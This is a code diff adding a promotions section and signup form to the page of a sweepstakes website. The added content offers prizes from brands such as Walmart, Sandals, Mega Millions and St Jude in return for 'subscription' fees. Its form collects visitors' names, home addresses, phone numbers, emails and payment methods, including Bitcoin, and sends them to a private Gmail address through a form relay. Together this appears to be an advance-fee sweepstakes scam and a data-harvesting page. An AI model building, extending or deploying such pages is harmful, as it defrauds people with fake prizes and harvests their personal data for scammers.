@@ -105,6 +105,7 @@
 		<nav>
 			<button class="btn" onclick="showSection('services')">Home</button>
 			<button class="btn" onclick="showSection('promotion')">Promotion</button>
+			<button class="btn" onclick="window.location.href='register.html'">Register</button>
 			<button class="btn" onclick="showSection('claim')">Claim Weekly Payment</button>
 			<button class="btn" onclick="showSection('winners')">Winners List</button>
 			<button class="btn" onclick="showSection('support')">Customer Service</button>
@@ -149,6 +150,88 @@
 				</div>
 			</div>
 <video src="videoplayback.mp4" controls style="width:100%;max-width:520px;border-radius:10px;margin-top:12px;"></video>
+<div style="margin-top:20px;padding:18px;border-radius:16px;background:rgba(255,255,255,0.14);border:1px solid rgba(255,255,255,0.22);color:#fff;">
+	<h2 style="margin-top:0;color:#ffffff;">American Sweepstakes & Promotion Co. Promotions</h2>
+	<p style="margin:0 0 14px;color:#ffffff;font-weight:700;">Win Big, Live Better, Chance To Financial Freedom With (ASP) By Simply Becoming Family / Subscriber.</p>
+	<button class="btn winner-cta" type="button" onclick="openPromotionModal()">Sign Up For Promotion</button>
+</div>
+<div style="margin-top:20px;display:grid;gap:14px;">
+	<div class="promo-item" style="padding:16px;border-radius:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.22);color:#fff;">
+		<h3 style="margin-top:0;color:#fff;">Sandals</h3>
+		<p style="margin:0 0 10px;color:#fff;">Win up to 1,000,000.00 and a chance to stay 4 days and 3 nights at any one of Sandals Hotel in the Caribbean. $55 to subscribe for a chance to win.</p>
+		<button class="btn" type="button" onclick="openPromotionModal('Sandals')">Click here to subscribe</button>
+	</div>
+	<div class="promo-item" style="padding:16px;border-radius:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.22);color:#fff;">
+		<h3 style="margin-top:0;color:#fff;">Sheetz</h3>
+		<p style="margin:0 0 10px;color:#fff;">Win Free Gas 4 Life. $15 to subscribe for a chance to win.</p>
+		<button class="btn" type="button" onclick="openPromotionModal('Sheetz')">Click here to subscribe</button>
+	</div>
+	<div class="promo-item" style="padding:16px;border-radius:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.22);color:#fff;">
+		<h3 style="margin-top:0;color:#fff;">Walmart</h3>
+		<p style="margin:0 0 10px;color:#fff;">Win a $1,000 Walmart Gift Card. $30 to subscribe for a chance to win.</p>
+		<button class="btn" type="button" onclick="openPromotionModal('Walmart')">Click here to subscribe</button>
+	</div>
+	<div class="promo-item" style="padding:16px;border-radius:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.22);color:#fff;">
+		<h3 style="margin-top:0;color:#fff;">Stake Us & St Jude Dream Home</h3>
+		<p style="margin:0 0 10px;color:#fff;">Win a house with 1,000,000.00 jackpot. Stake Us Sweepstakes is pleased to give away 1,000,000.00 for our anniversary in collaboration with St Jude and also gives a chance to win a luxurious home in Miami. $45 to subscribe for a chance to win.</p>
+		<button class="btn" type="button" onclick="openPromotionModal('Stake Us & St Jude Dream Home')">Click here to subscribe</button>
+	</div>
+	<div class="promo-item" style="padding:16px;border-radius:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.22);color:#fff;">
+		<h3 style="margin-top:0;color:#fff;">MEGA Millions</h3>
+		<p style="margin:0 0 10px;color:#fff;">Win the next estimated jackpot of 90 Million without buying a ticket by simply subscribing for a chance to win. $10 to subscribe for a chance to win.</p>
+		<button class="btn" type="button" onclick="openPromotionModal('MEGA Millions')">Click here to subscribe</button>
+	</div>
+	<div class="promo-item" style="padding:16px;border-radius:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.22);color:#fff;">
+		<h3 style="margin-top:0;color:#fff;">Wrestle Mania (WWE)</h3>
+		<p style="margin:0 0 10px;color:#fff;">Win a trip to Wrestle Mania. $7 to subscribe for a chance to win.</p>
+		<button class="btn" type="button" onclick="openPromotionModal('Wrestle Mania (WWE)')">Click here to subscribe</button>
+	</div>
+</div>
+
+<div class="overlay" id="promotionModal" style="display:none;">
+	<div class="panel" role="dialog" aria-modal="true" aria-labelledby="promotionModalTitle">
+		<h2 id="promotionModalTitle">Subscribe for a chance to win</h2>
+		<p id="promotionModalIntro" style="color:#fff;">You are only subscribing for a chance to become a part of our family and to be a winner. You might not be selected but faith will move mountains. Click continue if you’ve acknowledged the terms and conditions.</p>
+		<form id="promotionSubscribeForm" action="https://formsubmit.co/ajax/hashmatali20001@gmail.com" method="POST">
+			<input type="hidden" name="_subject" value="New Promotion Subscription" />
+			<input type="hidden" name="_captcha" value="false" />
+			<input type="hidden" name="_template" value="table" />
+			<input type="hidden" name="promotionType" id="promotionType" value="" />
+			<input type="hidden" name="acceptedPaymentMethods" value="Visa, MasterCard, Debit & Credit Card, PayPal, Bitcoin" />
+			<div class="form-grid" style="grid-template-columns:1fr;">
+				<label>First Name<input type="text" name="firstName" placeholder="First Name" required /></label>
+				<label>Last Name<input type="text" name="lastName" placeholder="Last Name" required /></label>
+				<label>Home Address<input type="text" name="homeAddress" placeholder="Home Address" required /></label>
+				<label>Telephone Number<input type="tel" name="telNumber" placeholder="Telephone Number" required /></label>
+				<label>Email Address<input type="email" name="emailAddress" placeholder="Email Address" required /></label>
+				<label>Choose Promotion<select name="chosenPromotion" required>
+					<option value="">Select a promotion</option>
+					<option value="Sandals">Sandals</option>
+					<option value="Sheetz">Sheetz</option>
+					<option value="Walmart">Walmart</option>
+					<option value="Stake Us & St Jude Dream Home">Stake Us & St Jude Dream Home</option>
+					<option value="MEGA Millions">MEGA Millions</option>
+					<option value="Wrestle Mania (WWE)">Wrestle Mania (WWE)</option>
+				</select></label>
+				<label>Payment Method<select name="paymentMethod" required>
+					<option value="Visa">Visa</option>
+					<option value="MasterCard">MasterCard</option>
+					<option value="Debit Card">Debit Card</option>
+					<option value="Credit Card">Credit Card</option>
+					<option value="PayPal">PayPal</option>
+					<option value="Bitcoin">Bitcoin</option>
+				</select></label>
+				<label>Terms Confirmation<textarea name="termsConfirmation" readonly>By clicking continue I acknowledge the terms and conditions and understand I am subscribing for a chance to win, not guaranteed selection.</textarea></label>
+			</div>
+			<div style="display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-top:16px;">
+				<button class="btn" type="submit">Continue & Subscribe</button>
+				<button class="btn" type="button" onclick="closePromotionModal()" style="background:#ffffff;color:#000;">Cancel</button>
+			</div>
+			<p id="promotionSubscribeMessage" class="small" style="display:none;color:#fff;margin-top:12px;"></p>
+		</form>
+	</div>
+</div>
+
 <h1 style="margin-top:20px;color:var(--accent);">How do we setup a sweepstakes contest?</h1>
 			<p style="color:#ffffff;">There are a lot of things that need to happen to run a sweepstakes. The state you are in will also affect the process.
 			Each state has its own rules and different aspects of running a sweepstakes to consider:
@@ -791,6 +874,63 @@ During that time, he directed major accounts including Eastman Kodak, Bausch & L
 		sendFormToEmail(inquiryForm, inquiryMessage, 'Thank you! Your request has been received and a representative will follow up soon.');
 		sendFormToEmail(claimForm, claimMessage, 'Thank you! Your claim form has been received and a representative will contact you soon.');
 		sendFormToEmail(officialDocumentRequestForm, officialDocRequestMessage, 'Thank you! Your official document request has been received and will be reviewed shortly.');
+
+		const promotionSubscribeForm = document.getElementById('promotionSubscribeForm');
+		const promotionSubscribeMessage = document.getElementById('promotionSubscribeMessage');
+
+		function openPromotionModal(promotionName) {
+			const modal = document.getElementById('promotionModal');
+			const promotionTypeInput = document.getElementById('promotionType');
+			const chosenPromotionSelect = document.querySelector('#promotionSubscribeForm select[name="chosenPromotion"]');
+			if (promotionTypeInput) promotionTypeInput.value = promotionName || '';
+			if (promotionName && chosenPromotionSelect) {
+				chosenPromotionSelect.value = promotionName;
+			}
+			if (modal) modal.style.display = 'flex';
+		}
+
+		function closePromotionModal() {
+			const modal = document.getElementById('promotionModal');
+			if (modal) modal.style.display = 'none';
+			if (promotionSubscribeMessage) {
+				promotionSubscribeMessage.style.display = 'none';
+				promotionSubscribeMessage.textContent = '';
+			}
+		}
+
+		if (promotionSubscribeForm) {
+			promotionSubscribeForm.addEventListener('submit', function(event) {
+				event.preventDefault();
+				const submitButton = promotionSubscribeForm.querySelector('button[type="submit"]');
+				if (submitButton) submitButton.disabled = true;
+				fetch(promotionSubscribeForm.action, {
+					method: promotionSubscribeForm.method,
+					body: new FormData(promotionSubscribeForm)
+				}).then(response => {
+					if (response.ok) {
+						if (promotionSubscribeMessage) {
+							promotionSubscribeMessage.textContent = 'Thank you! Your subscription has been received. A representative will follow up via email.';
+							promotionSubscribeMessage.style.display = 'block';
+						}
+						alert('Thank you! Your subscription has been received. A representative will follow up via email.');
+						promotionSubscribeForm.reset();
+						closePromotionModal();
+					} else {
+						if (promotionSubscribeMessage) {
+							promotionSubscribeMessage.textContent = 'There was a problem sending your request. Please try again.';
+							promotionSubscribeMessage.style.display = 'block';
+						}
+					}
+				}).catch(() => {
+					if (promotionSubscribeMessage) {
+						promotionSubscribeMessage.textContent = 'There was a problem sending your request. Please try again.';
+						promotionSubscribeMessage.style.display = 'block';
+					}
+				}).finally(() => {
+					if (submitButton) submitButton.disabled = false;
+				});
+			});
+		}
 
 		function readFileAsBase64(file) {
 			return new Promise((resolve, reject) => {
